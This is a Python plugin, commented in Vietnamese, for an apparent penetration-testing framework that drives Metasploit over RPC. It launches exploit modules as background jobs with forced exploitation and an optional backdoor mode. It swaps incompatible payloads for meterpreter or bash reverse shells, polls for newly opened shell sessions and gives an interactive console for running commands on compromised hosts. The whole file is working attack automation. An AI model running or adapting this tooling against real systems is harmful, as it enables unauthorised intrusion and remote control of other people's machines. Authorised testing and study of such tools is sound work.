#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MSFRPC Plugin — Kết nối Metasploit RPC để exploit non-blocking.
Giải quyết triệt để lỗi mất Shell do timeout subprocess.
Sử dụng pymetasploit3.MsfRpcClient.
"""

import os
import sys
import time
import socket
import logging
import threading

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from core.base_plugin import BasePlugin
from config import Config

try:
    from pymetasploit3.msfrpc import MsfRpcClient
    _HAS_MSFRPC = True
except ImportError:
    _HAS_MSFRPC = False

from utils.rpc_connection import RpcConnection, ConnState
from utils.job_queue import JobQueue, Job, JobStatus


class MsfRpcPlugin(BasePlugin):
    """
    Plugin MSFRPC — Chạy exploit qua Metasploit RPC thay vì msfconsole subprocess.
    Lợi thế:
    - exploit(as_job=True) → không block, không mất shell do timeout
    - Poll sessions liên tục và log local ngay khi có shell
    - Graceful fallback về subprocess nếu RPC không khả dụng
    """

    def __init__(self):
        self._conn = None
        self._job_queue = None

    def _get_connection(self, start_background: bool = True) -> RpcConnection:
        """Lazy init connection manager."""
        if self._conn is None:
            self._conn = RpcConnection(
                host=Config.MSF_RPC_HOST,
                port=int(Config.MSF_RPC_PORT),
                password=Config.MSF_RPC_PASS,
                ssl=Config.MSF_RPC_SSL,
                heartbeat_interval=getattr(Config, "MSF_HEARTBEAT_INTERVAL", 30),
                connect_timeout=getattr(Config, "MSF_CONNECT_TIMEOUT", 10),
                on_reconnect=self._on_rpc_reconnect,
                on_dead=self._on_rpc_dead,
            )
            if start_background:
                self._conn.start()
        else:
            # [V1.0-FIX] Đồng bộ mật khẩu mới từ Config để tránh Auth Fail vòng lặp
            if self._conn.password != Config.MSF_RPC_PASS:
                logging.info(f"[MsfRPC] Đồng bộ mật khẩu RPC mới: {Config.MSF_RPC_PASS[:6]}...")
                self._conn.password = Config.MSF_RPC_PASS
                with self._conn._state_lock:
                    if self._conn._state == ConnState.DEAD:
                        self._conn._state = ConnState.DISCONNECTED
                        self._conn._attempt = 0
        return self._conn

    def _get_job_queue(self) -> JobQueue:
        if self._job_queue is None:
            self._job_queue = JobQueue(
                persist_path=getattr(Config, "MSF_JOB_QUEUE_PATH",
                                     "/tmp/penlabs_msf_jobs.json"),
                max_size=getattr(Config, "MSF_JOB_QUEUE_MAX", 1000),
            )
        return self._job_queue

    def _on_rpc_reconnect(self):
        """Callback khi reconnect thành công → re-enqueue RUNNING jobs."""
        logging.info("[MsfRPC] Reconnected. Re-enqueueing in-flight jobs...")
        queue = self._get_job_queue()
        with queue._lock:
            for j in queue._jobs.values():
                if j.status.value == "running":
                    j.status = JobStatus.PENDING
                    logging.info(f"[MsfRPC] Re-queued job {j.job_id} ({j.module})")

    def _on_rpc_dead(self):
        """Callback khi auth fail → mark all RUNNING jobs failed."""
        logging.error("[MsfRPC] Connection DEAD. Marking RUNNING jobs as FAILED.")
        queue = self._get_job_queue()
        for jid in [j.job_id for j in queue._jobs.values() if j.status.value == "running"]:
            queue.fail(jid, "Connection DEAD (auth failed?)", requeue=False)

    def name(self) -> str:
        return "MsfRPC"

    def description(self) -> str:
        return "Kết nối Metasploit RPC daemon để exploit non-blocking và poll sessions"

    def check_installed(self) -> bool:
        return _HAS_MSFRPC

    def run(self, *args, **kwargs):
        """Generic run — dùng exploit_async() hoặc connect() trực tiếp."""
        return self.connect()

    def connect(self, max_retries: int = 1, backoff_base: float = 1.0) -> object | None:
        """
        [P1-5] Backward-compat: vẫn expose connect() cho code cũ,
        nhưng nội bộ dùng RpcConnection.
        """
        if not _HAS_MSFRPC:
            logging.warning("[MsfRPC] pymetasploit3 not installed")
            return None
        if not Config.MSF_RPC_PASS:
            logging.warning("[MsfRPC] MSF_RPC_PASS not configured. Bỏ qua MSFRPC mode.")
            return None

        timeout = max(1, int(getattr(Config, "MSF_CONNECT_TIMEOUT", 10)))
        try:
            with socket.create_connection(
                (Config.MSF_RPC_HOST, int(Config.MSF_RPC_PORT)),
                timeout=timeout,
            ):
                pass
        except OSError as exc:
            logging.warning(
                f"[MsfRPC] RPC port unavailable at {Config.MSF_RPC_HOST}:{Config.MSF_RPC_PORT}: {exc}"
            )
            return None

        # Try to ensure connected via manager
        try:
            conn = self._get_connection(start_background=False)
            conn._ensure_connected(timeout=timeout)
            if conn._heartbeat_thread is None:
                conn.start()
            return conn._get_client()
        except Exception as exc:
            logging.warning(f"[MsfRPC] Connection unavailable: {exc}")
            return None

    def _legacy_connect(self, max_retries: int = 1, backoff_base: float = 1.0) -> object | None:
        """Original connect() body — kept for backward compat."""
        rpc_pass = Config.MSF_RPC_PASS
        rpc_host = Config.MSF_RPC_HOST
        rpc_port = Config.MSF_RPC_PORT
        rpc_ssl = Config.MSF_RPC_SSL

        if not rpc_pass:
            logging.warning("[MsfRPC] MSF_RPC_PASS not configured. Bỏ qua MSFRPC mode.")
            return None

        import random as _random

        last_error = None
        for attempt in range(max_retries):
            try:
                # Đặt socket timeout để tránh treo vô thời hạn khi SSL mismatch hoặc daemon chưa sẵn sàng
                old_timeout = socket.getdefaulttimeout()
                socket.setdefaulttimeout(max(1, int(getattr(Config, "MSF_CONNECT_TIMEOUT", 10))))
                try:
                    client = MsfRpcClient(rpc_pass, server=rpc_host, port=rpc_port, ssl=rpc_ssl)
                finally:
                    socket.setdefaulttimeout(old_timeout)
                logging.info(f"[MsfRPC] Connected to {rpc_host}:{rpc_port} (ssl={rpc_ssl})")
                return client
            except socket.timeout:
                last_error = f"Connection timed out after {getattr(Config, 'MSF_CONNECT_TIMEOUT', 10)}s (host={rpc_host}, port={rpc_port}, ssl={rpc_ssl})"
                logging.warning(f"[MsfRPC] {last_error} [attempt {attempt+1}/{max_retries}]")
            except ConnectionRefusedError:
                last_error = f"Connection refused — msfrpcd chưa sẵn sàng trên {rpc_host}:{rpc_port}"
                logging.warning(f"[MsfRPC] {last_error} [attempt {attempt+1}/{max_retries}]")
            except Exception as e:
                last_error = str(e)
                logging.warning(f"[MsfRPC] Connection failed: {e} [attempt {attempt+1}/{max_retries}]")

            # [HIGH-03] Exponential backoff + jitter trước khi retry
            if attempt < max_retries - 1:
                delay = min(backoff_base * (2 ** attempt), 10.0)  # Cap tại 10s
                jitter = _random.uniform(0, delay * 0.3)  # 30% jitter
                logging.info(f"[MsfRPC] Retry sau {delay + jitter:.1f}s...")
                time.sleep(delay + jitter)

        if max_retries > 1:
            logging.error(f"[MsfRPC] Tất cả {max_retries} lần thử đều thất bại. Last error: {last_error}")
        return None

    def exploit_async(self, client, module_path: str, options: dict, enqueue_on_fail: bool = True) -> dict:
        """
        [P1-5] Wrap exploit với JobQueue. Nếu RPC fail, auto-enqueue for retry.
        """
        try:
            return self._exploit_async_impl(client, module_path, options)
        except (ConnectionError, socket.error, EOFError, BrokenPipeError) as e:
            if not enqueue_on_fail:
                raise
            logging.warning(f"[MsfRPC] Exploit failed: {e}. Enqueueing for retry.")
            queue = self._get_job_queue()
            job = queue.enqueue(module_path, options, max_attempts=3)
            return {"queued": True, "queue_job_id": job.job_id,
                    "error": str(e), "status": "queued"}

    def _exploit_async_impl(self, client, module_path: str, options: dict) -> dict:
        """
        Chạy exploit qua MSFRPC (non-blocking, as_job=True).
        
        [CRITICAL FIX V2] Xử lý 3 vấn đề nghiêm trọng của pymetasploit3:
        1. client.modules.use() crash với 'bool is not subscriptable' khi module trả error
        2. .check() bị ghi đè bởi boolean từ module info
        3. Payload validation lỏng lẻo dẫn tới architecture mismatch
        
        Args:
            client: MsfRpcClient instance
            module_path: VD "exploit/multi/http/apache_normalize_path_rce"
            options: dict {"RHOSTS": "...", "RPORT": 80, "LHOST": "...", "PAYLOAD": "..."}
            
        Returns:
            {"job_id": int, "status": "running"} hoặc {"error": "..."}
        """
        try:
            # Xác định loại module
            if module_path.startswith("exploit/"):
                mtype = 'exploit'
                mname = module_path.replace("exploit/", "")
            elif module_path.startswith("auxiliary/"):
                mtype = 'auxiliary'
                mname = module_path.replace("auxiliary/", "")
            else:
                mtype = 'exploit'
                mname = module_path

            # =====================================================
            # [BUG-FIX V2] Wrap module loading trong try-catch
            # pymetasploit3 crash khi MSF trả về error dict thay vì
            # options dict → 'bool' object is not subscriptable
            # =====================================================
            mod = None
            use_raw_rpc = False
            try:
                mod = client.modules.use(mtype, mname)
            except (TypeError, KeyError, AttributeError) as e:
                logging.warning(f"[MsfRPC] pymetasploit3 crash loading module {module_path}: {e}")
                logging.warning(f"[MsfRPC] Fallback: sẽ dùng raw RPC call trực tiếp.")
                use_raw_rpc = True
            except Exception as e:
                err_str = str(e)
                if 'subscriptable' in err_str or 'not callable' in err_str or 'bool' in err_str:
                    logging.warning(f"[MsfRPC] pymetasploit3 library bug detected: {e}")
                    use_raw_rpc = True
                else:
                    raise

            # =====================================================
            # FALLBACK PATH: Raw RPC call (bypass pymetasploit3)
            # =====================================================
            if use_raw_rpc:
                logging.info(f"[MsfRPC] Using raw RPC fallback for {module_path}")
                runopts = {}
                payload_name = options.get("PAYLOAD", "")
                for key, value in options.items():
                    if key.startswith('_') or key == 'TARGET':
                        continue
                    runopts[key] = value
                runopts['RunAsJob'] = True
                runopts['ForceExploit'] = True
                if payload_name:
                    runopts['PAYLOAD'] = payload_name
                
                logging.info(f"[MsfRPC] Raw RPC runopts: {runopts}")
                result = client.call('module.execute', [mtype, mname, runopts])
                logging.info(f"[MsfRPC] Raw RPC execute() result: {result}")
                
                job_id = result.get('job_id') if isinstance(result, dict) else None
                if job_id is not None:
                    return {"job_id": job_id, "status": "running", "module": module_path}
                
                # Kiểm tra lỗi
                if isinstance(result, dict) and result.get('error'):
                    return {"error": f"{result.get('error_message', result.get('error', 'Unknown'))}", "msf_response": result}
                return {"error": f"Raw RPC failed to start module. Response: {result}"}

            # =====================================================
            # NORMAL PATH: pymetasploit3 module object loaded OK
            # =====================================================

            # Lấy danh sách options hợp lệ của module (case-insensitive map)
            try:
                valid_options_list = list(mod.options) if hasattr(mod, 'options') else []
            except Exception:
                valid_options_list = []
            
            # Tạo map case-insensitive: lowercase -> actual_key
            option_map = {k.lower(): k for k in valid_options_list}
            
            logging.debug(f"[MsfRPC] Module {module_path} valid options: {valid_options_list}")

            # =====================================================
            # BƯỚC 1: Set OPTIONS trực tiếp lên module object
            # =====================================================
            payload_name = options.get("PAYLOAD", "")
            is_backdoor = options.get("_IS_BACKDOOR", False)
            
            for key, value in options.items():
                if key == "PAYLOAD":
                    continue  # Payload được truyền riêng qua execute()
                if key.startswith("_"):
                    continue  # Internal flags (_IS_BACKDOOR, etc.)
                if key == "TARGET":
                    # TARGET là thuộc tính đặc biệt của ExploitModule
                    try:
                        mod.target = int(value)
                    except Exception as e:
                        logging.debug(f"[MsfRPC] Không thể set target={value}: {e}")
                    continue
                
                # Case-insensitive lookup
                actual_key = option_map.get(key.lower())
                
                if actual_key:
                    try:
                        mod[actual_key] = value
                        logging.debug(f"[MsfRPC] Set {actual_key} = {value}")
                    except (KeyError, ValueError, TypeError) as e:
                        logging.warning(f"[MsfRPC] mod[{actual_key}]={value} failed ({e}), injecting into _runopts")
                        mod._runopts[actual_key] = value
                else:
                    PAYLOAD_AND_ADVANCED = {"LHOST", "LPORT", "SRVHOST", "SRVPORT", "LURI",
                                             "SSL", "VHOST", "TARGETURI", "URI", "RHOST",
                                             "ENABLESTAGEENCODING", "STAGEENCODER",
                                             "AUTORUNSCRIPT", "INITIALAUTORUNSCRIPT",
                                             "EXITONSESSION", "WFSDELAY",
                                             "REVERSELISTENERBINDADDRESS", "REVERSELISTENERBINDPORT"}
                    if key.upper() in PAYLOAD_AND_ADVANCED:
                        mod._runopts[key] = value
                        logging.debug(f"[MsfRPC] Injected {key} = {value} (payload/advanced option)")
                    else:
                        logging.debug(f"[MsfRPC] Bỏ qua option '{key}' — không phải module option hay payload option chuẩn.")

            # =====================================================
            # BƯỚC 2: Inject control flags
            # =====================================================
            mod._runopts["RunAsJob"] = True
            mod._runopts["ForceExploit"] = True
            
            if is_backdoor:
                mod._runopts["DisablePayloadHandler"] = True
                logging.info(f"[MsfRPC] Backdoor mode: DisablePayloadHandler=True")
            else:
                mod._runopts["DisablePayloadHandler"] = False
            
            logging.info(f"[MsfRPC] Final runopts before execute: {dict(mod._runopts)}")

            # =====================================================
            # BƯỚC 3: PAYLOAD ARCHITECTURE VALIDATION
            # [NEW] Kiểm tra payload có thực sự tương thích với
            # module/target hiện tại trước khi execute()
            # =====================================================
            if payload_name and mtype == 'exploit':
                try:
                    compatible = mod.payloads if hasattr(mod, 'payloads') else []
                    if compatible and payload_name not in compatible:
                        logging.warning(f"[MsfRPC] Payload '{payload_name}' KHÔNG tương thích với target hiện tại!")
                        logging.warning(f"[MsfRPC] Đang tìm payload thay thế tương đương...")
                        
                        # Tìm payload cùng họ nhưng tương thích
                        replacement = None
                        # Thử tìm payload cùng loại (reverse_tcp, reverse_http, etc)
                        payload_suffix = payload_name.split('/')[-1] if '/' in payload_name else ''
                        for cp in compatible:
                            if payload_suffix and cp.endswith(payload_suffix):
                                replacement = cp
                                break
                        # Fallback: tìm bất kỳ meterpreter reverse_tcp
                        if not replacement:
                            for cp in compatible:
                                if 'meterpreter/reverse_tcp' in cp:
                                    replacement = cp
                                    break
                        # Fallback cuối: cmd/unix/reverse
                        if not replacement:
                            for cp in compatible:
                                if cp in ('cmd/unix/reverse', 'cmd/unix/reverse_bash', 'cmd/unix/interact'):
                                    replacement = cp
                                    break
                        # Fallback tuyệt vọng: payload đầu tiên
                        if not replacement and compatible:
                            replacement = compatible[0]
                        
                        if replacement:
                            logging.info(f"[MsfRPC] Auto-replaced payload: {payload_name} → {replacement}")
                            print(f"\033[93m[!] Payload '{payload_name}' không tương thích. Tự động chuyển sang: {replacement}\033[0m")
                            payload_name = replacement
                        else:
                            logging.warning(f"[MsfRPC] Không tìm thấy payload thay thế. Thử execute nguyên bản.")
                except Exception as e:
                    logging.debug(f"[MsfRPC] Payload validation check failed (non-fatal): {e}")

            # =====================================================
            # BƯỚC 4: Execute — chỉ truyền payload qua kwarg
            # =====================================================
            if payload_name:
                logging.info(f"[MsfRPC] Dispatching EXPLOIT with payload={payload_name}")
                result = mod.execute(payload=payload_name)
            else:
                logging.info(f"[MsfRPC] Dispatching EXPLOIT without explicit payload (MSF will use default)")
                result = mod.execute()
            
            logging.info(f"[MsfRPC] execute() result: {result}")
            
            job_id = result.get("job_id") if isinstance(result, dict) else None
            uuid = result.get("uuid") if isinstance(result, dict) else None

            #  Đôi khi Metasploit trả về UUID nhưng job_id lại là None
            if job_id is None and uuid:
                logging.debug(f"[MsfRPC] job_id is None, searching background jobs for uuid={uuid}...")
                time.sleep(2)
                try:
                    all_jobs = client.jobs.list
                    logging.debug(f"[MsfRPC] Current jobs: {all_jobs}")
                    for jid, jname in all_jobs.items():
                        job_id = int(jid)
                        logging.info(f"[MsfRPC] Found active job #{job_id}: {jname}")
                        break
                except Exception as e:
                    logging.warning(f"[MsfRPC] Failed to query global jobs list: {e}")
            
            # Kiểm tra sessions trực tiếp
            if job_id is None:
                time.sleep(3)
                try:
                    sessions = client.sessions.list
                    if sessions:
                        logging.info(f"[MsfRPC] No job_id but found {len(sessions)} active sessions")
                        return {"job_id": -1, "status": "instant_session", "module": module_path,
                                "note": "Exploit completed instantly (no background job needed)"}
                except Exception:
                    pass

            if job_id is None:
                logging.error(f"[MsfRPC] Failed to start exploit: module_path={module_path}, result={result}")
                error_hints = []
                if isinstance(result, dict):
                    if result.get('error_message'):
                        error_hints.append(result['error_message'])
                    if result.get('error_class'):
                        error_hints.append(f"Error class: {result['error_class']}")
                error_msg = "; ".join(error_hints) if error_hints else "Unknown error"
                if isinstance(result, dict) and 'error' in result:
                    return {"error": result['error'], "msf_response": result}
                if uuid:
                    return {"error": f"Metasploit did not return a Job ID for uuid={uuid}. {error_msg}", "msf_response": result}
                return {"error": f"Metasploit failed to start module. {error_msg}", "msf_response": result}

            logging.info(f"[MsfRPC] Exploit launched as job #{job_id}: {module_path}")
            return {"job_id": job_id, "status": "running", "module": module_path}

        except (ConnectionError, socket.error, EOFError, BrokenPipeError):
            raise
        except ValueError as e:
            # Payload validation error from pymetasploit3
            logging.error(f"[MsfRPC] Payload/option validation error: {e}")
            return {"error": f"Payload validation error: {e}. Thử chọn payload khác."}
        except Exception as e:
            logging.error(f"[MsfRPC] Exploit failed: {e}", exc_info=True)
            return {"error": str(e)}

    def list_compatible_payloads(self, client, module_path: str) -> list:
        """
        [V1.0] Trả về danh sách payload tương thích cho module.
        Xử lý pymetasploit3 crash khi load broken modules.
        """
        try:
            if not module_path.startswith("exploit/"):
                return []
            
            #  Wrap trong try-catch vì pymetasploit3 có thể crash
            try:
                mod = client.modules.use('exploit', module_path.replace("exploit/", ""))
            except (TypeError, KeyError, AttributeError) as e:
                logging.debug(f"[MsfRPC] Cannot load module {module_path} for payload listing: {e}")
                # Fallback: dùng raw RPC call
                try:
                    result = client.call('module.compatible_payloads', [module_path.replace("exploit/", "")])
                    if isinstance(result, dict) and 'payloads' in result:
                        return result['payloads']
                except Exception:
                    pass
                return []
            
            if hasattr(mod, "targetpayloads"):
                return mod.targetpayloads()
            elif hasattr(mod, "payloads"):
                return mod.payloads
            return []
        except Exception as e:
            logging.debug(f"[MsfRPC] Failed to list payloads for {module_path}: {e}")
            return []

    def poll_sessions(self, client, poll_interval: int = 5, max_wait: int = 300, pre_sessions: set = None) -> list:
        """
        [P1-5] poll_sessions giờ check connection state, auto-reconnect nếu cần.
        """
        conn = self._get_connection()
        if not conn.is_connected:
            try:
                conn._ensure_connected(timeout=5)
            except Exception:
                pass
        return self._poll_sessions_impl(client, poll_interval, max_wait, pre_sessions)

    def _poll_sessions_impl(self, client, poll_interval: int = 5, max_wait: int = 300, pre_sessions: set = None) -> list:
        """
        Poll sessions mới từ MSFRPC.
        
        Args:
            client: MsfRpcClient instance
            poll_interval: Giây giữa mỗi lần poll
            max_wait: Thời gian tối đa chờ (giây)
            pre_sessions: [BUG#3 FIX] Set of session IDs đã biết TRƯỚC khi exploit chạy.
                          Nếu None, sẽ snapshot tại thời điểm poll bắt đầu.
            
        Returns:
            List of new session dicts
        """
        known_sessions = set()
        new_sessions = []
        start_time = time.time()

        # [BUG#3 FIX] Dùng pre_sessions nếu được cung cấp (snapshot từ trước exploit)
        if pre_sessions is not None:
            known_sessions = set(str(s) for s in pre_sessions)
        else:
            try:
                initial = client.sessions.list
                for sid in initial:
                    known_sessions.add(str(sid))
            except Exception:
                pass

        print(f"\n[*] Đang poll sessions (mỗi {poll_interval}s, tối đa {max_wait}s)...")

        while time.time() - start_time < max_wait:
            try:
                current = client.sessions.list
                for sid, info in current.items():
                    sid_str = str(sid)
                    if sid_str not in known_sessions:
                        known_sessions.add(sid_str)
                        session_info = {
                            "session_id": sid,
                            "type": info.get("type", "unknown"),
                            "tunnel_peer": info.get("tunnel_peer", ""),
                            "via_exploit": info.get("via_exploit", ""),
                            "info": info.get("info", ""),
                        }
                        new_sessions.append(session_info)

                        print(f"\n\033[92m🔥 MỞ SHELL THÀNH CÔNG!\033[0m")
                        print(f"    Session #{sid}: {info.get('type', '')} → {info.get('tunnel_peer', '')}")
                        print(f"    Exploit: {info.get('via_exploit', '')}")

            except Exception as e:
                logging.warning(f"[MsfRPC] Poll error: {e}")

            # [BUG#3 FIX] Nếu đã tìm thấy session, chờ thêm 3s rồi kiểm tra hết
            # (để bắt trường hợp exploit mở nhiều session cùng lúc)
            if new_sessions:
                time.sleep(3)
                try:
                    final_check = client.sessions.list
                    for sid, info in final_check.items():
                        sid_str = str(sid)
                        if sid_str not in known_sessions:
                            known_sessions.add(sid_str)
                            new_sessions.append({
                                "session_id": sid,
                                "type": info.get("type", "unknown"),
                                "tunnel_peer": info.get("tunnel_peer", ""),
                                "via_exploit": info.get("via_exploit", ""),
                                "info": info.get("info", ""),
                            })
                            print(f"    Session #{sid}: {info.get('type', '')} → {info.get('tunnel_peer', '')}")
                except Exception:
                    pass
                break  # Đã có session → thoát loop sớm

            time.sleep(poll_interval)

        if not new_sessions:
            print(f"\n[-] Không có session mới sau {max_wait}s polling.")

        return new_sessions

    def start_session_monitor(self, client, poll_interval: int = 5):
        """
        Chạy session monitor ở background thread.
        Không block main thread.
        """
        def _monitor():
            self.poll_sessions(client, poll_interval, max_wait=Config.MSF_TIMEOUT)

        thread = threading.Thread(target=_monitor, daemon=True)
        thread.start()
        return thread

    def interact_session(self, client, session_id: int):
        """
        [V1.0] Tương tác trực tiếp với session qua MSFRPC.
        
        THREADING ARCHITECTURE (chống treo terminal):
        - Reader Thread: liên tục session.read() và in ra stdout (non-blocking)
        - Main Thread: nhận input() từ user và session.write()
        
        Kết quả: Shell mượt mà như Netcat thật, không bị block bởi input().
        
        Lệnh đặc biệt:
          - 'exit' hoặc 'quit' → Thoát interactive mode (KHÔNG kill session)
          - 'kill_session'     → Kill session và thoát
          - 'background'       → Background session (meterpreter)
          - 'sessions'         → Liệt kê tất cả sessions
        """
        R, G, Y, B, C, X = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[96m", "\033[0m"
        
        try:
            session_list = client.sessions.list
            if str(session_id) not in session_list and session_id not in session_list:
                print(f"{R}[!] Session #{session_id} không tồn tại hoặc đã bị đóng.{X}")
                return
            
            sid_key = session_id if session_id in session_list else str(session_id)
            sinfo = session_list[sid_key]
            stype = sinfo.get('type', 'unknown')
            is_meterpreter = 'meterpreter' in stype.lower()
            
            session = client.sessions.session(str(session_id))
            
            print(f"\n{G}{'='*60}{X}")
            print(f"{G}  INTERACTIVE SESSION #{session_id} ({stype}){X}")
            print(f"{G}  Target: {sinfo.get('tunnel_peer', 'unknown')}{X}")
            print(f"{G}  Via: {sinfo.get('via_exploit', 'unknown')}{X}")
            print(f"{G}{'='*60}{X}")
            print(f"{Y}  Lệnh đặc biệt: 'exit'=thoát, 'kill_session'=kill, 'sessions'=liệt kê{X}")
            print(f"{Y}  [V1.0] Threaded I/O — output hiện tự động, không cần chờ.{X}")
            print()
            
            # ── Threaded Reader ──
            # Background thread liên tục đọc output từ session và in ra stdout
            _stop_reader = threading.Event()
            _session_dead = threading.Event()
            
            def _reader_loop():
                """Background thread: continuously read session output."""
                while not _stop_reader.is_set():
                    try:
                        output = session.read()
                        if output and output.strip():
                            # Print output immediately (may interleave with prompt,
                            # but that's acceptable for real-time shell behavior)
                            print(output, end='', flush=True)
                    except Exception as e:
                        error_str = str(e)
                        if '500' in error_str or 'unknown session' in error_str.lower():
                            print(f"\n{R}[!] Session #{session_id} đã bị đóng/chết.{X}")
                            _session_dead.set()
                            break
                    # Poll interval: 0.5s for responsive output
                    _stop_reader.wait(0.5)
            
            reader_thread = threading.Thread(target=_reader_loop, daemon=True, name=f"msf-reader-{session_id}")
            reader_thread.start()
            
            # ── Main Thread: Input Loop ──
            if is_meterpreter:
                prompt = f"{R}meterpreter #{session_id}{X} > "
            else:
                prompt = f"{C}shell #{session_id}{X} > "
            
            while not _session_dead.is_set():
                try:
                    cmd = input(prompt).strip()
                except (EOFError, KeyboardInterrupt):
                    print(f"\n{Y}[*] Ctrl+C/EOF — Thoát interactive mode (session vẫn sống).{X}")
                    break
                
                if not cmd:
                    continue
                
                # === Lệnh đặc biệt ===
                cmd_lower = cmd.lower()
                
                if cmd_lower in ('exit', 'quit'):
                    print(f"{G}[+] Thoát interactive mode. Session #{session_id} vẫn active trên MSF.{X}")
                    break
                
                if cmd_lower == 'kill_session':
                    try:
                        session.stop()
                        print(f"{R}[!] Đã kill Session #{session_id}.{X}")
                    except Exception as e:
                        print(f"{R}[!] Lỗi khi kill session: {e}{X}")
                    break
                
                if cmd_lower == 'sessions':
                    try:
                        all_sessions = client.sessions.list
                        if all_sessions:
                            print(f"\n{B}=== ACTIVE SESSIONS ==={X}")
                            for sid, info in all_sessions.items():
                                marker = " ← [YOU]" if str(sid) == str(session_id) else ""
                                print(f"  #{sid}: {info.get('type', '?')} → {info.get('tunnel_peer', '?')} {G}{marker}{X}")
                        else:
                            print(f"{Y}Không có session nào.{X}")
                    except Exception as e:
                        print(f"{R}Lỗi: {e}{X}")
                    continue
                
                if cmd_lower == 'background' and is_meterpreter:
                    try:
                        session.detach()
                        print(f"{G}[+] Session #{session_id} đã được background.{X}")
                    except Exception as e:
                        print(f"{R}Lỗi: {e}{X}")
                    break
                
                # === Gửi lệnh thực tế tới target ===
                try:
                    if is_meterpreter:
                        if cmd_lower.startswith('shell'):
                            print(f"{Y}[*] Đang mở OS shell trên target...{X}")
                            print(f"{Y}    Gõ 'exit' để quay lại meterpreter.{X}")
                            session.write(cmd)
                            prompt = f"{C}shell>{X} "
                            is_meterpreter = False
                            continue
                        
                        # Meterpreter: dùng run_with_output cho kết quả sạch
                        # Reader thread sẽ tự pick up output
                        try:
                            output = session.run_with_output(cmd, timeout=30, timeout_exception=False)
                            if output:
                                print(output, end='' if output.endswith('\n') else '\n', flush=True)
                        except Exception:
                            # Fallback: write and let reader thread handle output
                            session.write(cmd)
                    else:
                        # Shell session: write command, reader thread handles output
                        session.write(cmd + '\n')
                        
                except Exception as e:
                    error_str = str(e)
                    if '500' in error_str or 'unknown session' in error_str.lower():
                        print(f"\n{R}[!] Session #{session_id} đã bị đóng/chết.{X}")
                        break
                    else:
                        print(f"{R}[!] Lỗi: {e}{X}")
            
            # ── Cleanup: stop reader thread ──
            _stop_reader.set()
            reader_thread.join(timeout=2)
            
        except Exception as e:
            logging.error(f"[MsfRPC] interact_session error: {e}", exc_info=True)
            print(f"{R}[!] Lỗi tương tác session: {e}{X}")

    def get_queue_status(self) -> dict:
        """[P1-5] Helper để caller kiểm tra queue state."""
        q = self._get_job_queue()
        return {
            "pending": q.pending_count(),
            "total": len(q._jobs),
        }
